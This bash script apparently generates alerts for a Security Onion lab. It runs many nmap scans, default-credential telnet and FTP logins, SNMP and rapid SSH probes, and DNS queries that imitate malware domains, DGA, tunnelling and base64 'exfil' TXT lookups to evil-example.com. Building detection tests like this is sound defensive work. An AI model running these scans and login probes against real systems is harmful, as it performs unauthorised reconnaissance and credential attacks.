#!/bin/bash
# =============================================================================
# Security Onion Alert Generator - Scan & DNS Focus
# No HTTP dependency - all attacks work against passive sniffing interface
# Usage: sudo bash scan_dns_alerts.sh [TARGET_IP]
# =============================================================================

TARGET="${1:-10.0.2.10}"

if [ "$EUID" -ne 0 ]; then
  echo "Please run with sudo: sudo bash $0 $TARGET"
  exit 1
fi

echo "═══════════════════════════════════════════════"
echo "  Scan & DNS Alert Generator"
echo "  Target: $TARGET"
echo "  Time:   $(date -u)"
echo "═══════════════════════════════════════════════"
echo ""

# ---------------------------------------------------------
# STAGE 1: Port Scans
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 1: Port Scans                 ║"
echo "╚══════════════════════════════════════╝"

echo "[*] SYN scan - database ports (PostgreSQL, MySQL, MSSQL, Oracle)"
nmap -sS -Pn -p 1433,1521,3306,5432,27017 $TARGET -T4 2>/dev/null

echo "[*] SYN scan - common service ports"
nmap -sS -Pn -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,3389,5900,8080,8443 $TARGET -T4 2>/dev/null

echo "[*] FIN scan (stealth - triggers ET SCAN)"
nmap -sF -Pn --top-ports 100 $TARGET -T4 2>/dev/null

echo "[*] XMAS scan (triggers ET SCAN)"
nmap -sX -Pn --top-ports 100 $TARGET -T4 2>/dev/null

echo "[*] NULL scan (triggers ET SCAN)"
nmap -sN -Pn --top-ports 100 $TARGET -T4 2>/dev/null

echo "[*] ACK scan (firewall mapping)"
nmap -sA -Pn --top-ports 100 $TARGET -T4 2>/dev/null

echo "[*] Window scan"
nmap -sW -Pn --top-ports 50 $TARGET -T4 2>/dev/null

echo "[*] Version detection"
nmap -sV -Pn -p 22,80,443 $TARGET --version-intensity 5 2>/dev/null

echo "[*] OS fingerprinting"
nmap -O -Pn $TARGET 2>/dev/null

echo "[*] Aggressive scan with default scripts"
nmap -A -Pn -T4 $TARGET 2>/dev/null

echo "[*] UDP scan - common ports"
nmap -sU -Pn -p 53,67,68,69,123,161,162,500,514,1900 $TARGET -T4 2>/dev/null

echo "[*] Full port range SYN scan (generates volume)"
nmap -sS -Pn -p 1-10000 $TARGET -T5 --max-retries 0 2>/dev/null

echo "[*] Repeated scans from different source ports"
for sport in 20 53 80 88 443; do
  nmap -sS -Pn -g $sport -p 22,80,443,445,3389 $TARGET -T4 2>/dev/null
done

echo ""
echo "[✓] Stage 1 complete"
sleep 2

# ---------------------------------------------------------
# STAGE 2: Protocol Connection Probes
# ---------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════╗"
echo "║  Stage 2: Protocol Probes            ║"
echo "╚══════════════════════════════════════╝"

echo "[*] Telnet attempts (triggers ET POLICY)"
for i in $(seq 1 5); do
  echo -e "admin\npassword\n" | nc -w 2 $TARGET 23 2>/dev/null || true
done

echo "[*] FTP login attempts (triggers ET FTP)"
for user in root admin anonymous ftp administrator backup; do
  echo -e "USER $user\r\nPASS password123\r\nQUIT\r\n" | nc -w 2 $TARGET 21 2>/dev/null || true
done

echo "[*] SMB/NetBIOS probes (triggers ET NETBIOS)"
for port in 135 139 445; do
  nc -w 2 $TARGET $port < /dev/null 2>/dev/null || true
done

echo "[*] SNMP community string probes"
echo -ne '\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00' | nc -u -w 2 $TARGET 161 2>/dev/null || true
echo -ne '\x30\x29\x02\x01\x01\x04\x07private\xa0\x1b\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x00\x30\x0d\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00' | nc -u -w 2 $TARGET 161 2>/dev/null || true

echo "[*] SSH rapid connections (brute force pattern)"
for i in $(seq 1 30); do
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o BatchMode=yes \
    "admin@$TARGET" exit 2>/dev/null || true
done

echo "[*] RDP connection probes"
nc -w 2 $TARGET 3389 < /dev/null 2>/dev/null || true

echo "[*] Suspicious high-port connections"
for port in 4444 5555 6666 7777 8888 9999 1234 31337 12345 54321; do
  nc -w 1 $TARGET $port < /dev/null 2>/dev/null || true
done

echo "[*] ICMP sweeps (large payloads)"
for i in $(seq 1 15); do
  ping -c 1 -s 1400 -W 1 $TARGET 2>/dev/null || true
done

echo ""
echo "[✓] Stage 2 complete"
sleep 2

# ---------------------------------------------------------
# STAGE 3: DNS Activity
# ---------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════╗"
echo "║  Stage 3: Malicious DNS              ║"
echo "╚══════════════════════════════════════╝"

echo "[*] Known threat-related domain lookups"
THREAT_DOMAINS=(
  "evil.com"
  "malware-test.com"
  "cobaltstrike.com"
  "mimikatz.com"
  "metasploit.com"
  "darkcomet.com"
  "zeus.com"
  "cryptolocker.com"
  "wannacry.com"
  "emotet.com"
  "trickbot.com"
  "lockbit.com"
  "revil.com"
  "cobalt-strike.net"
  "meterpreter.org"
  "shellcode.ninja"
  "exploit-db.com"
  "kali.org"
  "parrot.sh"
  "offensive-security.com"
)
for domain in "${THREAT_DOMAINS[@]}"; do
  dig +short $domain 2>/dev/null
  sleep 0.2
done

echo "[*] DGA-style random domains (.xyz, .top, .tk, .pw, .cc)"
for i in $(seq 1 40); do
  RAND=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w $(shuf -i 8-20 -n 1) | head -n 1)
  TLD=$(echo -e "xyz\ntop\ntk\npw\ncc\nbiz\nclub\ninfo" | shuf -n 1)
  dig +short "${RAND}.${TLD}" 2>/dev/null
  sleep 0.1
done

echo "[*] Long subdomain queries (possible tunneling)"
for i in $(seq 1 20); do
  ENCODED=$(head -c 48 /dev/urandom | base64 | tr -d '=+/' | head -c 50)
  dig +short "${ENCODED}.tunnel.evil-example.com" 2>/dev/null
  sleep 0.2
done

echo "[*] DNS TXT record queries (C2 channel)"
for i in $(seq 1 15); do
  PAYLOAD=$(echo "exfil-chunk-$i-$(date +%s)" | base64 | tr -d '=' | tr '+/' '-_')
  dig TXT "${PAYLOAD}.cmd.evil-example.com" 2>/dev/null
  sleep 0.2
done

echo "[*] Rapid DNS queries (anomaly trigger)"
for i in $(seq 1 100); do
  dig +short "host${i}.botnet-c2.xyz" 2>/dev/null &
done
wait

echo "[*] Reverse DNS lookups on suspicious ranges"
for i in $(seq 1 20); do
  OCTET=$((RANDOM % 256))
  dig -x "10.${OCTET}.${OCTET}.${OCTET}" +short 2>/dev/null
done

echo "[*] DNS zone transfer attempts (triggers ET DNS rules)"
dig axfr evil-example.com @$TARGET 2>/dev/null || true
dig axfr example.com @$TARGET 2>/dev/null || true

echo "[*] ANY record queries (amplification pattern)"
for domain in google.com facebook.com amazon.com cloudflare.com; do
  dig ANY $domain 2>/dev/null
  sleep 0.3
done

echo ""
echo "[✓] Stage 3 complete"

# ---------------------------------------------------------
# Done
# ---------------------------------------------------------
echo ""
echo "═══════════════════════════════════════════════"
echo "  Alert Generation Complete"
echo "  Time: $(date -u)"
echo ""
echo "  Wait 2-3 minutes, then check SOC console:"
echo "  Alerts → Last 1 hour → Refresh"
echo "═══════════════════════════════════════════════"
